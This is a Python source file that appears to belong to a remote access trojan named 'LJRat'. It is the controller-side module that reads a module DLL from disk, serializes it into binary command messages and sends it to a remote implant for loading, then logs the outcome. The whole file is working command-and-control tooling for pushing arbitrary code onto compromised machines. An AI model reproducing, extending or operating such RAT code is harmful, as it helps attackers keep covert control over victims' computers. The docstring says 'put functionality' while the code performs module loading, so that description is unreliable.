"""
Module that adds the put functionality to LJRat
"""

import struct
import message
import os
import log
from error import *
from helper import str_to_c_str
from globals import ctx, MODULE_PATH, DLL_EXT
from session import HEADER_LEN, INT_SIZE
from modules import mod_funcs


MODULE_ID = 0x06
LOADED = True
DLL_NAME = None

def entrypoint(self, args):
    """ Load a module into memory """
    
    # Validate local file exists prior to building the message
    args = validator(args)
    if not args:
        return None

    module_args = {"MODULE_NAME": args[0], "REMOTE_MODULE_ID": args[1], "JOB_ID": ctx.get_next_job()}
    msg = message.Message(_serialize(module_args))
    msg.remote_module_id = args[1]
    return msg


def validator(args):
    '''Function to check if module is already loaded and file exists locally'''
    args = args.split()
    if len(args) < 1:
        print("Invalid command - Refer to help for valid syntax")
        return None

 
    module_id = ctx.get_module_id(args[0])
    if not module_id:
        print("Invalid module")
        return None
    
    if not ctx.check_loaded(module_id):
        # Logic to load library
        module_name = ctx.get_module_name(module_id)
        path = MODULE_PATH + module_name + DLL_EXT

        if not os.path.exists(path):
            print("Module dll not found on disk")
            return None
    
        args = [path, module_id]

    return args

def _serialize(data):
    '''Function to take all the required arguments and pack a data structure with binary data'''
    serialized_data = bytearray()
    file_bytes = None

    result_code = 0
    cmd_type = MODULE_ID
    job_id = data["JOB_ID"]

    with open(data["MODULE_NAME"], "rb") as infile:
        local_file = infile.read()
    
    local_DLL_len = len(local_file)
    remote_module_id = data["REMOTE_MODULE_ID"]
    data_len = HEADER_LEN + INT_SIZE + INT_SIZE + local_DLL_len

    serialized_data.extend(struct.pack("I", data_len))
    serialized_data.extend(struct.pack("I", job_id))
    serialized_data.extend(struct.pack("I", cmd_type))
    serialized_data.extend(struct.pack("I", result_code))
    serialized_data.extend(struct.pack("I", remote_module_id))
    serialized_data.extend(struct.pack("I", local_DLL_len))
    serialized_data.extend(struct.pack(f"{local_DLL_len}s", local_file))

    return serialized_data


def _deserialize(msg):
    '''Function that calls the formatter and outputs the data to a log'''
    log_dir = ctx.log_dir

    if msg.result_code == E_SUCCESS:
        log.write_to_log(log_dir, ".load", ERROR_TABLE[msg.result_code], "Module loaded successfully")
    else:
        print(f"Error loading module: {ERROR_TABLE[msg.result_code]}")

    return